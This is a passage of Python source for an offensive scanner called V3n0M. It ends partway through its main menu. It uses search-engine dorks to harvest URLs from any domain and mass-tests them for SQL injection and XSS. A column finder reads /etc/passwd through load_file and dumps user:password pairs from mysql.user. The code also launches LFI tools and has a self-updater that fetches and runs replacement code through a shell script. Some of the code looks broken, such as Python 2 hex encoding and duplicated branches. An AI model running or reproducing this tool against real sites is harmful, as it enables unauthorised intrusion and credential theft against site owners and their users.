#!/usr/bin/python
# -*- coding: latin-1 -*-
#
#                       This program has been based upon the smartd0rk3r and darkd0rker
#                       It has been heavily edited, updated and improved upon by Novacygni
#                       but in no way is this the sole work of NovaCygni, and credit is due
#                       to every person who has worked on this tool. Thanks people. NovaCygni
#
# noinspection PyBroadException


try:
    import re, random, threading, socket, urllib.request, urllib.error, urllib.parse, http.cookiejar, subprocess, \
        time, sys, os, math, itertools, queue, asyncio, aiohttp, argparse, socks, httplib2, requests, codecs
    from signal import SIGINT, signal
    import bs4, tqdm
    from glob import glob
    from pathlib import Path
    from codecs import lookup, register
    from random import SystemRandom
    from socket import *
    from datetime import *


except:
    print("\n|------ PYTHON PROBLEM DETECTED! Recovery Menu Enabled -----| ")
    print(" ")
    print(" ")
    print(" Exception Error Message encountered: "
          "" + str(Exception))
    print(" ")
    print(" ")
    print("|--- You are advised to run either or both steps below   ---| ")
    print("|--- Recovery Menu :::: please let me know if you have any problems with it!   ---| ")
    print("| --Note, if your running Ubuntu you may need to run --> sudo apt-get install python3-bs4 --| ")
    print("| --Note, Requires Sudo or Root to perform updates/fixes to Python      ")
    print("")
    print("             V3n0M python modules can be updated with either option below            ")
    print("[1] Run Pip3.6 and Auto-Update Python3.6 modules to latest versions, ")
    print("[2] Auto-Install all the required v3n0m modules specified in the program requirements")
    print("[3] Exit")
    print(" ")
    print(" ")
    print(" Note: Both recovery options will at the end, perform a check at the end so everything is upto date")
    chce = input(":")
    import time
    import pip
    from subprocess import call

    if chce == '1':
        sys.stdout.flush()
        print("Warning This will force upgrade all Python3.6 modules")
        print("You will have 10 seconds to cancel this action before the system begins")
        print("Note: This will entirely reinstall all current installed modules aswell to clear possible problems")
        time.sleep(10)
        for dist in pip.get_installed_distributions():
            call("sudo pip3.6 install --upgrade --no-deps --force-reinstall " + dist.project_name, shell=True)
            call("sudo pip3.6 freeze --local | grep -v '^\-e' | cut -d = -f 1  | xargs -n1 sudo pip3.6 install -U",
                 shell=True)
            pass
        pass
    if chce == '2':
        sys.stdout.flush()
        print(
            "This will install the missing modules and upgrade them to current versions then update your Python3.6 entirely")
        print("You will have 10 seconds to cancel this action before the system begins")
        print("sudo is required as these changes are systemwide upgrades/updates for Python")
        time.sleep(10)
        call("sudo pip3.6 install aiohttp --upgrade ", shell=True)
        call("sudo pip3.6 install asyncio --upgrade ", shell=True)
        call("sudo pip3.6 install bs4 --upgrade ", shell=True)
        call("sudo pip3.6 install dnspython --upgrade ", shell=True)
        call("sudo pip3.6 install tqdm --upgrade ", shell=True)
        call("sudo pip3.6 install datetime --upgrade ", shell=True)
        call("sudo pip3.6 install requests --upgrade ", shell=True)
        call("sudo pip3.6 install socksipy-branch --upgrade ", shell=True)
        call("sudo pip3.6 install httplib2 --upgrade ", shell=True)
        call("sudo pip3.6 freeze --local | grep -v '^\-e' | cut -d = -f 1  | xargs -n1 sudo pip3 install -U", shell=True)
        pass
    if chce == '3':
        exit()

__name__ = '__main__'


# Banner
def logo():
    cache_Check()
    print(R + "\n|----------------------------------------------------------------|")
    print("| Release Date Sept 11th 2017   " + B + "        Author: NovaCygni       " + R + " |")
    print("|        Proxy Enabled " + G + " [", ProxyEnabled, "] " + R + "                               |")
    print("|        Cache & Log Status " + B + " [", cachestatus, "] " + R + "           |")
    print("| " + O +"Features:" + "SQli-Dorker DNS-Bruteforcer AdminPage-Finder " + R + "         |")
    print("|   " + O + "Toxin-Vulnerable-IPs-Scanner Cloudflare-Resolver XSS&LFI>RCE "+ R +"|")
    print("|                    _____       _____                           |")
    print("|          " + G + "         |____ |     |  _  |    " + R + "                      |")
    print("|             __   __   / /_ __ | |/' |_ _" + G + "_ ___             " + R + "     |")
    print("|             \ \ / /  " + G + " \ \ '" + R + "_ \|  /| | '_ ` _ \                 |")
    print("|              \ V" + G + " /.___/ / | | \ |_" + R + "/ / | | | | |                |")
    print("|    Official   \_/" + G + " \____/|_" + R + "| |_|" + G + "\___/|_| |_| " + R + "|_| Release",
          current_version, " \
|")
    print("|----------------------------------------------------------------|\n")


def killpid():
    os.kill(os.getpid(), 9)


class Injthread(threading.Thread):
    def __init__(self, hosts):
        self.hosts = hosts
        self.fcount = 0
        self.check = True
        threading.Thread.__init__(self)

    def run(self):
        urls = list(self.hosts)
        for url in urls:
            try:
                if self.check:
                    classicinj(url)
                else:
                    break
            except KeyboardInterrupt:
                pass
        self.fcount += 1

    def stop(self):
        self.check = False





class xssthread(threading.Thread):
    def __init__(self, hosts):
        self.hosts = hosts
        self.fcount = 0
        self.check = True
        threading.Thread.__init__(self)

    def run(self):
        urls = list(self.hosts)
        for url in urls:
            try:
                if self.check:
                    classicxss(url)
                else:
                    break
            except KeyboardInterrupt:
                pass
        self.fcount += 1

    def stop(self):
        self.check = False



# noinspection PyBroadException
def classicxss(url):
    for xss in xsses:
        if url not in vuln:
            try:
                source = urllib.request.urlopen(url + xss.replace("\n", "")).read()
                if not (not re.findall(str("<OY1Py"), source) and not re.findall(str("<LOY2PyTRurb1c"), source)):
                    print(R + "\r\x1b[K[XSS]: ", O + url + xss, R + " ---> XSS Found")
                    xss_log_file.write("\n" + url + xss)
                    vuln.append(url)
            except:
                if len(xss + url) < 147:
                    sys.stdout.write(
                        B + "\r\x1b[K [*] Testing %s%s" % (
                            url, xss))
                    sys.stdout.flush()




# noinspection PyBroadException
def xsstest():
    print(B + "\n[+] Preparing for XSS scanning ...")
    print("[+] Can take a while ...")
    print("[!] Working ...\n")
    vb = len(usearch) / int(numthreads)
    i = int(vb)
    m = len(usearch) % int(numthreads)
    z = 0
    if len(threads) <= int(numthreads):
        for x in range(0, int(numthreads)):
            sliced = usearch[x * i:(x + 1) * i]
            if z < m:
                sliced.append(usearch[int(numthreads) * i + z])
                z += 1
            thread = xssthread(sliced)
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()


customSelected = False
# Apoligies for this ugly section of code
# It is just a placeholder
# So dont worry, itll be replaced soon enough
# noinspection PyBroadException
def classicinj(url):
    aug_url = url + "'"
    try:
        try:
            resp = urllib.request.urlopen(aug_url)
        except:  # if response is not Code:200 then instead of passing nothing causing hanging
            resp = str("v3n0m")  # to throw a value to stop null/non-200-status messages hanging the scanner
        hits = str(resp.read())
        if str("error in your SQL syntax") in hits:
            print(url + " is vulnerable --> MySQL Classic")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("mysql_fetch") in hits:
            print(url + " is Vulnerable --> MiscError")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("num_rows") in hits:
            print(url + " is Vulnerable --> MiscError2")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("ORA-01756") in hits:
            print(url + " is Vulnerable --> Oracle")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("Error Executing Database Query") in hits:
            print(url + " is Vulnerable --> JDBC_CFM")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("SQLServer JDBC Driver") in hits:
            print(url + " is Vulnerable --> JDBC_CFM2")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("OLE DB Provider for SQL Server") in hits:
            print(url + " is Vulnerable --> MSSQL_OLEdb")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("Unclosed quotation mark") in hits:
            print(url + " is Vulnerabe --> MSSQL_Uqm")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("ODBC Microsoft Access Driver") in hits:
            print(url + " is Vulnerable --> MS-Access_ODBC")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("Microsoft JET Database") in hits:
            print(url + " is Vulnerable --> MS-Access_JETdb")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("Error Occurred While Processing Request") in hits:
            print(url + " is Vulnerable --> Processing Request")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("Microsoft JET Database") in hits:
            print(url + " is Vulnerable --> MS-Access JetDb")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("Error Occurred While Processing Request") in hits:
            print(url + " is Vulnerable --> Processing Request ")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("Server Error") in hits:
            print(url + " is Vulnerable --> Server Error")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("ODBC Drivers error") in hits:
            print(url + " is Vulnerable --> ODBC Drivers error")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("Invalid Querystring") in hits:
            print(url + " is Vulnerable --> Invalid Querystring")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("OLE DB Provider for ODBC") in hits:
            print(url + " is Vulnerable --> OLE DB Provider for ODBC")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("VBScript Runtime") in hits:
            print(url + " is Vulnerable --> VBScript Runtime")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("ADODB.Field") in hits:
            print(url + " is Vulnerable --> ADODB.Field")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("BOF or EOF") in hits:
            print(url + " is Vulnerable --> BOF or EOF")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("ADODB.Command") in hits:
            print(url + " is Vulnerable --> ADODB.Command")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("JET Database") in hits:
            print(url + " is Vulnerable --> JET Database")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("mysql_fetch_array") in hits:
            print(url + " is Vulnerabe --> mysql_fetch_array")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("Syntax error") in hits:
            print(url + " is Vulnerable --> Syntax error")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("mysql_numrows()") in hits:
            print(url + " is Vulnerable --> mysql_numrows()")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("GetArray()") in hits:
            print(url + " is Vulnerable --> GetArray()")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("FetchRow()") in hits:
            print(url + " is Vulnerable --> FetchRow()")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("Input string was not in a correct format") in hits:
            print(url + " is Vulnerable --> Input String Error")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        else:
            pass
    except:
        pass


# noinspection PyBroadException
def life_pulse():
    global life
    pulse_1 = datetime.now()
    life = pulse_1 - pulse
    print(life)


# noinspection PyBroadException
def injtest():
    global logfile
    global pulse
    global usearch
    global customlist
    pulse = datetime.now()
    if not customSelected:
        log = "v3n0m-sqli.txt"
        logfile = open(log, "a")
        vb = len(usearch) / int(numthreads)
        i = int(vb)
        m = len(usearch) % int(numthreads)
        z = 0
        print(B + "\n[+] Preparing for SQLi scanning ...")
        print("[+] Can take a while and appear not to be doing anything...")
        print("[!] Please be patient if you can see this message, its Working ...\n")
        try:
            if len(threads) <= int(numthreads):
                for x in range(0, int(numthreads)):
                    sliced = usearch[x * i:(x + 1) * i]
                    if z < m:
                        sliced.append(usearch[int(numthreads) * i + z])
                        z += 1
                    thread = Injthread(sliced)
                    thread.start()
                    threads.append(thread)
                for thread in threads:
                    thread.join()
        except TimeoutError:
            pass
    else:
        try:
            log = input('Enter file name and location: ')
            with open(log) as hodor:
                for line in hodor:
                    hold_door = str(line.rstrip())+"'"
                    hold_the_door = line.rstrip()
                    try:
                        resp = urllib.request.urlopen(hold_door)
                        hits = str(resp.read())
                    except: # In event of Exception throw pointless str so scan at least just continues.
                        hits = '0'
                    if str("error in your SQL syntax") in hits:
                        print(hold_the_door + " is vulnerable --> MySQL Classic")
                    elif str("mysql_fetch") in hits:
                        print(hold_the_door + " is Vulnerable --> MiscError")
                    elif str("num_rows") in hits:
                        print(hold_the_door + " is Vulnerable --> MiscError2")
                    elif str("ORA-01756") in hits:
                        print(hold_the_door + " is Vulnerable --> Oracle")
                    elif str("Error Executing Database Query") in hits:
                        print(hold_the_door + " is Vulnerable --> JDBC_CFM")
                    elif str("SQLServer JDBC Driver") in hits:
                        print(hold_the_door + " is Vulnerable --> JDBC_CFM2")
                    elif str("OLE DB Provider for SQL Server") in hits:
                        print(hold_the_door + " is Vulnerable --> MSSQL_OLEdb")
                    elif str("Unclosed quotation mark") in hits:
                        print(hold_the_door + " is Vulnerabe --> MSSQL_Uqm")
                    elif str("ODBC Microsoft Access Driver") in hits:
                        print(hold_the_door + " is Vulnerable --> MS-Access_ODBC")
                    elif str("Microsoft JET Database") in hits:
                        print(hold_the_door + " is Vulnerable --> MS-Access_JETdb")
                    elif str("Error Occurred While Processing Request") in hits:
                        print(hold_the_door + " is Vulnerable --> Processing Request")
                    elif str("Microsoft JET Database") in hits:
                        print(hold_the_door + " is Vulnerable --> MS-Access JetDb")
                    elif str("Error Occurred While Processing Request") in hits:
                        print(hold_the_door + " is Vulnerable --> Processing Request ")
                    elif str("Server Error") in hits:
                        print(hold_the_door + " is Vulnerable --> Server Error")
                    elif str("ODBC Drivers error") in hits:
                        print(hold_the_door + " is Vulnerable --> ODBC Drivers error")
                    elif str("Invalid Querystring") in hits:
                        print(hold_the_door + " is Vulnerable --> Invalid Querystring")
                    elif str("OLE DB Provider for ODBC") in hits:
                        print(hold_the_door + " is Vulnerable --> OLE DB Provider for ODBC")
                    elif str("VBScript Runtime") in hits:
                        print(hold_the_door + " is Vulnerable --> VBScript Runtime")
                    elif str("ADODB.Field") in hits:
                        print(hold_the_door + " is Vulnerable --> ADODB.Field")
                    elif str("BOF or EOF") in hits:
                        print(hold_the_door + " is Vulnerable --> BOF or EOF")
                    elif str("ADODB.Command") in hits:
                        print(hold_the_door + " is Vulnerable --> ADODB.Command")
                    elif str("JET Database") in hits:
                        print(hold_the_door + " is Vulnerable --> JET Database")
                    elif str("mysql_fetch_array") in hits:
                        print(hold_the_door + " is Vulnerabe --> mysql_fetch_array")
                    elif str("Syntax error") in hits:
                        print(hold_the_door + " is Vulnerable --> Syntax error")
                    elif str("mysql_numrows()") in hits:
                        print(hold_the_door + " is Vulnerable --> mysql_numrows()")
                    elif str("GetArray()") in hits:
                        print(hold_the_door + " is Vulnerable --> GetArray()")
                    elif str("FetchRow()") in hits:
                        print(hold_the_door + " is Vulnerable --> FetchRow()")
                    elif str("Input string was not in a correct format") in hits:
                        print(hold_the_door + " is Vulnerable --> Input String Error")
                    else:
                        pass
        except FileNotFoundError or Exception:
            print("Target file not found!")
            print(Exception)
            time.sleep(2)
            fmenu()



# noinspection PyBroadException
def colfinder():
    print(B + "\n[+] Preparing for Column Finder ...")
    print("[+] Can take a while ...")
    print("[!] Working ...")
    for host in col:
        print(R + "\n[+] Target: ", O + host)
        print(R + "[+] Attempting to find the number of columns ...")
        print("[+] Testing: ", end=' ')
        checkfor = []
        host = host.rsplit("'", 1)[0]
        sitenew = host + arg_eva + "and" + arg_eva + "1=2" + arg_eva + "union" + arg_eva + "all" + arg_eva + "select" + arg_eva
        makepretty = ""
        for x in range(0, colMax):
            darkc0de = "dark" + str(x) + "c0de"
            try:
                sys.stdout.write("%s," % x)
                sys.stdout.flush()
                checkfor.append(darkc0de)
                if x > 0:
                    sitenew += ","
                sitenew += "0x" + str(darkc0de.encode("hex"))
                finalurl = sitenew + arg_end
                source = urllib.request.urlopen(finalurl).read()
                for y in checkfor:
                    colFound = re.findall(y, source)
                    if len(colFound) >= 1:
                        print("\n[+] Column length is:", len(checkfor))
                        nullcol = re.findall(str("\d+"), y)
                        print("[+] Found null column at column #:", nullcol[0])
                        for z in range(0, len(checkfor)):
                            if z > 0:
                                makepretty += ","
                            makepretty += str(z)
                        site = host + arg_eva + "and" + arg_eva + "1=2" + arg_eva + "union" + arg_eva + "all" + arg_eva + "select" + arg_eva + makepretty
                        print("[+] SQLi URL:", site + arg_end)
                        site = site.replace("," + nullcol[0] + ",", ",darkc0de,")
                        site = site.replace(arg_eva + nullcol[0] + ",", arg_eva + "darkc0de,")
                        site = site.replace("," + nullcol[0], ",darkc0de")
                        print("[+] darkc0de URL:", site)
                        darkurl.append(site)

                        print("[-] Done!\n")
                        break
            except:
                pass

        print("\n[!] Sorry column length could not be found\n")
    print(B + "\n[+] Gathering MySQL Server Configuration...")
    for site in darkurl:
        head_url = site.replace("2600",
                                "concat(0x1e,0x1e,version(),0x1e,user(),0x1e,database(),0x1e,0x20)") + arg_end
        print(R + "\n[+] Target:", O + site)
        while 1:
            try:
                source = urllib.request.urlopen(head_url).read()
                match = re.findall(str("\x1e\x1e\S+"), source)
                if len(match) >= 1:
                    match = match[0][2:].split("\x1e")
                    version = match[0]
                    user = match[1]
                    database = match[2]
                    print(W + "\n\tDatabase:", database)
                    print("\tUser:", user)
                    print("\tVersion:", version)
                    load = site.replace("2600", "load_file(0x2f6574632f706173737764)")
                    source = urllib.request.urlopen(load).read()
                    if re.findall(str("root:x"), source):
                        load = site.replace("2600", "concat_ws(char(58),load_file(0x" + str(file.encode(
                            "hex")) + "),0x62616c74617a6172)")
                        source = urllib.request.urlopen(load).read()
                        search = re.findall(str("NovaCygni"), source)
                        if len(search) > 0:
                            print("\n[!] w00t!w00t!: " + site.replace("2600",
                                                                      "load_file(0x" + str(file.encode("hex")) + ")"))
                        load = site.replace("2600",
                                            "concat_ws(char(58),user,password,0x62616c74617a6172)") + arg_eva + "from" + arg_eva + "mysql.user"
                    source = urllib.request.urlopen(load).read()
                    if re.findall(str("NovaCygni"), source):
                        print("\n[!] w00t!w00t!: " + site.replace("2600",
                                                                  "concat_ws(char(58),user,password)") + arg_eva + "from" + arg_eva + "mysql.user")
                print(W + "\n[+] Number of tables:", len(tables))
                print("[+] Number of columns:", len(columns))
                print("[+] Checking for tables and columns...")
                target = site.replace("2600", "0x62616c74617a6172") + arg_eva + "from" + arg_eva + "T"
                for table in tables:
                    try:
                        target_table = target.replace("T", table)
                        source = urllib.request.urlopen(target_table).read()
                        search = re.findall(str("NovaCygni"), source)
                        if len(search) > 0:
                            print("\n[!] Table found: < " + table + " >")
                            print("\n[+] Lets check for columns inside table < " + table + " >")
                            for column in columns:
                                try:
                                    source = urllib.request.urlopen(target_table.replace("0x62616c74617a6172",
                                                                                         "concat_ws(char(58),0x62616c74617a6172," + column + ")")).read()
                                    search = re.findall(str("NovaCygni"), source)
                                    if len(search) > 0:
                                        print("\t[!] Column found: < " + column + " >")
                                except(KeyboardInterrupt, SystemExit):
                                    raise
                                except(urllib.error.URLError, socket.gaierror, socket.error, socket.timeout):
                                    pass

                            print("\n[-] Done searching inside table < " + table + " > for columns!")

                    except(KeyboardInterrupt, SystemExit):
                        raise
                    except(urllib.error.URLError, socket.gaierror, socket.error, socket.timeout):
                        pass
                print("[!] Fuzzing is finished!")
                break
            except(KeyboardInterrupt, SystemExit):
                raise


# noinspection PyBroadException,PyGlobalUndefined
def fscan():
    import time
    global pages_pulled_as_one
    global usearch
    global numthreads
    global threads
    global finallist
    global finallist2
    global col
    global darkurl
    global sitearray
    global loaded_Dorks
    threads = []
    finallist = []
    finallist2 = []
    col = []
    darkurl = []
    loaded_Dorks = []
    print(W)
    sites = input(
        "\nChoose your target(domain) ie .com , to attempt to force the domain restriction use *, ie *.com : ")
    sitearray = [sites]
    dorks = input("Choose the number of random dorks (0 for all.. may take awhile!)   : ")
    print("")
    if int(dorks) == 0:
        i = 0
        while i < len(d0rk):
            loaded_Dorks.append(d0rk[i])
            i += 1
    else:
        i = 0
        while i < int(dorks):
            loaded_Dorks.append(d0rk[i])
            i += 1
    numthreads = input('\nEnter no. of threads, Between 50 and 500: ')
    pages_pulled_as_one = input('Enter no. of Search Engine Pages to be scanned per d0rk,  \n'
                                ' Between 20 and 100, increments of 20. Ie> 20:40:60:80:100   : ')
    print("\nNumber of SQL errors :", "26")
    print("LFI payloads    :", len(lfis))
    print("XSS payloads    :", len(xsses))
    print("Headers         :", len(header))
    print("Threads         :", numthreads)
    print("Dorks           :", len(loaded_Dorks))
    print("Pages           :", pages_pulled_as_one)
    print("Timeout         :", timeout)
    time.sleep(5)
    loop = asyncio.get_event_loop()
    usearch = loop.run_until_complete(search(pages_pulled_as_one))
    vulnscan()


def cloud():
    import time
    logo()
    target_site = input("Enter the site eg target.com: \n")
    print(B)
    pwd = os.path.dirname(str(os.path.realpath(__file__)))
    print("Depth Level: 1) Scan top 30 subdomains 2) Scan top 200 subdomains 3) Scan over 9000+ subdomains ")
    depth = input("Input Depth Level, 1, 2 or 3 : ")
    scandepth = ""
    if depth == 1:
        scandepth = "--dept simple"
    elif depth == 2:
        scandepth = "--dept normal"
    elif depth == 3:
        scandepth = "--dept full"
    cloud = subprocess.Popen('python3.6 ' + pwd + "/cloudbuster.py " + str(target_site) + scandepth, shell=True)
    cloud.communicate()
    subprocess._cleanup()
    print("Cloud Resolving Finished")
    time.sleep(6)


def det_Neph():
    print("")


def det_Honeyd():
    print("")


def det_Kippo():
    print("")


# noinspection PyBroadException
def vulnscan():
    global endsub
    global lfi_log_file
    global rce_log_file
    global xss_log_file
    global vuln
    lfi_log_file = open("v3n0m-lfi.txt", "a")
    rce_log_file = open("v3n0m-rce.txt", "a")
    xss_log_file = open("v3n0m-xss.txt", "a")
    endsub = 0
    print(R + "\n[1] SQLi Testing, " + O + "Will verify the Vuln links and print the Injectable URL to the screen")
    print(
        R + "[2] SQLi Testing Auto Mode " + O + "Will attempt to Verify vuln sites then Column count if MySQL detected")
    print(R + "[3] Launch LFI Suite")
    print(R + "[4] XSS Testing")
    print(R + "[5] Save valid Sorted and confirmed vuln urls to file")
    print(R + "[6] Print all the UNSORTED urls ")
    print(R + "[7] Print all Sorted and Confirmed Vulns from last scan again")
    print(R + "[8] Back to main menu")
    chce = input(":")
    if chce == '1':
        os.system('clear')
        vuln = []
        injtest()
        print(B + "\r\x1b[K [*] Scan complete, " + O + str(len(col)) + B + " vuln sites found.")
        print()
    elif chce == '2':
        os.system('clear')
        vuln = []
        injtest()
        colfinder()
        endsub = 0
        print(B + "\r\x1b[K [*] Scan complete, " + O + str(len(vuln)) + B + " vuln sites found.")
        print()
    elif chce == '3':
        os.system('clear')
        path = os.path.dirname(str(os.path.realpath(__file__)))
        lfisuite = subprocess.Popen('python3.6 ' + path + "/lfisuite.py ", shell=True)
        lfisuite.communicate()
        subprocess._cleanup()
    elif chce == '4':
        os.system('clear')
        vuln = []
        xsstest()
        print(B + "\r\x1b[K [*] Scan complete, " + O + str(len(vuln)) + B + " vuln sites found.")
        print()
        endsub = 0
    elif chce == '5':
        print(B + "\nSaving valid urls (" + str(len(finallist)) + ") to file")
        listname = input("Filename: ")
        list_name = open(listname, "w")
        finallist.sort()
        for t in finallist:
            list_name.write(t + "\n")
        list_name.close()
        print("Urls saved, please check", listname)
        endsub = 0
    elif chce == '6':
        print(W + "\nPrinting valid urls:\n")
        finallist.sort()
        for t in finallist:
            print(B + t)
        endsub = 0
    elif chce == '7':
        print(B + "\nVuln found ", len(vuln))
        print(vuln)
        endsub = 0
    elif chce == '8':
        endsub = 1
        fmenu()
    else:
        fmenu()


# noinspection PyBroadException

def ignoringGet(url):
    try:
        try:
            responce = requests.get(url)
            responce.raise_for_status()
        except Exception:
            return ''
        return responce.text
    except Exception:
        print(Exception)



def CreateTempFolder(self):
    from tempfile import mkdtemp
    self.temp = mkdtemp(prefix='v3n0m')
    if not self.temp.endswith(os.sep):
        self.temp += os.sep


def upgrade():
    import time
    global page
    global revision
    try:
        print(R + ' [+]' + W + ' checking for latest version...')
        try:
            sock = ignoringGet(
                'https://raw.githubusercontent.com/v3n0m-Scanner/V3n0M-Scanner/master/src/v3n0m.py')
            page = sock
            try:
                if str("Release 412" or "Release 413" or
                               "Release 44" or "Release 45" or "Release 46" or "Release 47" or "Release 48" or "Release 49"
                       or "Release 5" or "Release 6" or "Release 7" or "Release 8" or "Release 9") in page:
                    revision = int(411)
                else:
                    revision = current_version
                    print(R + ' [!]' + W + ' Current version is either Latest or No Update was detected')
                    time.sleep(4)
                    pass
            except KeyboardInterrupt:
                pass
        except KeyboardInterrupt:
            pass
        if revision >= current_version:
            print(R + " [!] [Program Debug Info] I did revision as", G + str(revision), R + "and current version as",
                  G + str(current_version))
            print(R + ' [!]' + W + ' a new version is ' + G + 'available!' + W)
            print(R + ' [-]' + W + '   revision:    ' + G + str(revision), 'or Higher Available' + W)
            response = input(R + ' [+]' + W + ' do you want to upgrade to the latest version? (y/n): ')
            if not response.lower().startswith('y'):
                print(R + ' [-]' + W + ' upgrading ' + O + 'aborted' + W)
                fmenu()
                return
            print(R + ' [+] ' + G + 'downloading' + W + ' update...')
            try:
                sock = urllib.request.urlopen(
                    'https://raw.githubusercontent.com/v3n0m-Scanner/V3n0M-Scanner/master/src/v3n0m.py')
                page = sock.read()
            except IOError:
                page = ''
            if page == '':
                print(R + ' [+] ' + O + 'unable to download latest version' + W)
            f = open('v3n0m_new.py', 'w')
            f.write(page)
            f.close()
            this_file = __file__
            if this_file.startswith('./'):
                this_file = this_file[2:]
            f = open('update_v3n0m.sh', 'w')
            f.write('''#!/bin/sh\n
                           rm -rf ''' + this_file + '''\n
                           mv v3n0m_new.py ''' + this_file + '''\n
                           rm -rf update_v3n0m.sh\n
                           chmod +x ''' + this_file + '''\n
                          ''')
            f.close()
            returncode = call(['chmod', '+x', 'update_v3n0m.sh'])
            if returncode != 0:
                print(R + ' [!]' + O + ' permission change returned unexpected code: ' + str(returncode) + W)
                fmenu()
            # Run the script
            returncode = call(['sh', 'update_v3n0m.sh'])
            if returncode != 0:
                print(R + ' [!]' + O + ' upgrade script returned unexpected code: ' + str(returncode) + W)
                fmenu()
            print(R + ' [+] ' + G + 'updated!' + W + ' type "./' + this_file + '" to run again')
        else:
            pass
    except Exception:
        print(R + '\n (^C)' + O + str(Exception) + W)
    fmenu()


# noinspection PyBroadException
async def search(pages_pulled_as_one):
    urls = []
    urls_len_last = 0
    timestart = datetime.now()
    for site in sitearray:
        progress = 0
        for dork in loaded_Dorks:
            progress += 1
            page = 0
            while page < int(pages_pulled_as_one):
                query = dork + "+site:" + site
                futures = []
                loop = asyncio.get_event_loop()
                for i in range(10):
                    results_web = "http://www.bing.com/search?q=" + query + "&go=Submit&first=" + str(
                        (page + i) * 50 + 1) + "&count=50"
                    futures.append(loop.run_in_executor(None, ignoringGet, results_web))
                page += 10
                stringreg = re.compile('(?<=href=")(.*?)(?=")')
                names = []
                for future in futures:
                    result = await future
                    names.extend(stringreg.findall(result))
                domains = set()
                for name in names:
                    basename = re.search(r"(?<=(://))[^/]*(?=/)", name)
                    if (basename is None) or any([x.strip() in name for x in search_Ignore.splitlines(keepends=True)]):
                        basename = re.search(r"(?<=://).*", name)
                    if basename is not None:
                        basename = basename.group(0)
                    if basename not in domains and basename is not None:
                        domains.add(basename)
                        urls.append(name)
                totalprogress = len(loaded_Dorks)
                percent = int((1.0 * progress / int(totalprogress)) * 100)
                urls_len = len(urls)
                os.system('clear')
                start_time = datetime.now()
                timeduration = start_time - timestart
                ticktock = timeduration.seconds
                hours, remainder = divmod(ticktock, 3600)
                minutes, seconds = divmod(remainder, 60)
                sys.stdout.flush()
                logo()
                sys.stdout.write(W +
                                 "\r\x1b[K " + R + "| Domain: <%s> Has been targeted \n "
                                                   "| Collected urls: %s Since start of scan \n"
                                                   " | D0rks: %s/%s Progressed so far \n"
                                                   " | Percent Done: %s \n"
                                                   " | Current page no.: <%s> in Cycles of 10 Page results pulled in Asyncio\n"
                                                   " | Dork In Progress: %s\n"
                                                   " | Elapsed Time: %s\n" % (R +
                                                                              site, repr(urls_len), progress,
                                                                              totalprogress,
                                                                              repr(percent), repr(page), dork,
                                                                              '%s:%s:%s' % (hours, minutes, seconds)))
                sys.stdout.flush()
                if urls_len == urls_len_last:
                    page = int(pages_pulled_as_one)
                urls_len_last = urls_len
    tmplist = []
    print("\n\n[+] URLS (unsorted) : Contains all the trash results still including duplicates: ", len(urls))
    for url in urls:
        try:
            host = url.split("/", 3)
            domain = host[2]
            if domain not in tmplist and "=" in url:
                finallist.append(url)
                tmplist.append(domain)
        except KeyboardInterrupt:
            os.system('clear')
            chce1 = input(':')
            logo()
            print(G + "Program Paused" + R)
            print("[1] Unpause")
            print("[2] Skip rest of scan and Continue with current results")
            print("[3] Return to main menu")
            if chce1 == "1":
                return
            if chce1 == "2":
                vulnscan()
            if chce1 == "3":
                fmenu()
            else:
                pass
            continue
    print("[+] URLS (sorted)  : Trash, Duplicates, Dead-Links and other rubbish removed ", len(finallist))
    return finallist


# noinspection PyBroadException
def fmenu():
    import time
    global customSelected
    global vuln
    global customlist
    vuln = []
    if endsub != 1:
        vulnscan()
    logo()
    print("[1] Dork and Vuln Scan")
    print("[2] Admin page finder")
    print("[3] Toxin - **NOT RELEASED YET: NOT FINISHED: DONT BOTHER TRYING **")
    print("[4] DNS brute")
    print("[5] Enable Tor/Proxy Support")
    print("[6] Cloudflare Resolving")
    print("[7] Misc Options")
    print("[0] Exit\n")
    chce = input(":")

    if chce == '1':
        print(W + "")
        fscan()

    elif chce == '2':
        afsite = input("Enter the site eg target.com: ")
        print(B)
        pwd = os.path.dirname(str(os.path.realpath(__file__)))
